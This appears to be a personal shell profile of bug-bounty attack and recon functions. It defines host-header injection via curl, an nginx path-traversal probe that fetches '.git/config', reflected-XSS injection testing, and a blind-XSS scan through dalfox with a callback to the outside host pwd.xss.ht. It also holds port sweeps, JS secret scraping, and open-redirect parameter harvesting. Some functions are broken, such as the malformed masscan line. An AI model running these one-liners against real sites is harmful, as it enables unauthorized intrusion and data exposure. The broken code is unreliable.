
hostinjection(){


for i in $(cat "$1"); do curl "$i" --request-target "$2" -v -k --path-as-is --max-time 2 ; done

}


arj(){

python3 /home/secudz/tools/Arjun/arjun.py -u $1 --get

}


Mostrceport(){


nmap -p 1090,1098,1099,4444,11099,47001,47002,10999,7000-7004,8000-8003,9000-9003,9503,7070,2375,8088,6066,8983,8383,4990,8880,7071,6379,8500,8880,5000,45000,45001,8686,9012,50500,4848,11111,4444,4445,4786,5555,5556,443,8080,8081,8443,80,81 -T4 -Pn -iL "$1" -oA nmap.txt --data-length=60

}

Nmap(){

sudo nmap -sT -sV -O -p4443,2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,744 -T4 $1 -Pn

}

readjs(){

gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'

}




otx(){
	gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$1?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq
}



xss(){
gau $1 | grep '=' | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace hack\" -a | while read url;do target=$(curl -s -l $url | egrep -o '(hack"|hack\\")'); echo -e "Target:\e[1;33m $url\e[0m" "$target" "\n-------"; done | sed 's/hack"/[Xss Possible] Reflection Found/g'


}
nginxjuicy(){

curl -sk --path-as-is https://$1/static../.git/config | gin | egrep '^  name ='

}

blindxss(){

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://pwd.xss.ht
}



redUrl() { 
 gau -subs $1 | grep "redirect" >> $1_redirectall.txt |  gau -subs $1 | grep "redirect=" >> $1_redirectequal.txt |  gau -subs $1 | grep "url" >> $1_urlall.txt |  gau -subs $1 | grep "url=" >> $1_urlequal.txt |  gau -subs $1 | grep "next=" >> $1_next.txt |  gau -subs $1 | grep "dest=" >> $1_dest.txt |  gau -subs $1 | grep "destination" >> $1_destination.txt |  gau -subs $1 | grep "return" >> $1_return.txt |  gau -subs $1 | grep "go=" >> $1_go.txt |  gau -subs $1 | grep "redirect_uri" >> $1_redirecturi.txt |  gau -subs $1 | grep "continue=" >> $1_continue.txt |  gau -subs $1 | grep "return_path=" >> $1_path.txt |  gau -subs $1 | grep "externalLink=" >> $1_link.txt |  gau -subs $1 | grep "URL=" >> $1_URL.txt 
}

crtsh(){
curl -s https://crt.sh/?Identity=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | awk 'NF'
}

certspotter(){ 
curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
} 

mscan(){ 
sudo masscan -p4443,2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,744 1$}
}


crtshdirsearch(){ 
curl -s https://crt.sh/?q\=%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe -c 50 | grep https | xargs -n1 -I{} python3 ~/tools/dirsearch/dirsearch.py -u {} -e $2 -t 50 -b 
}



export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH 
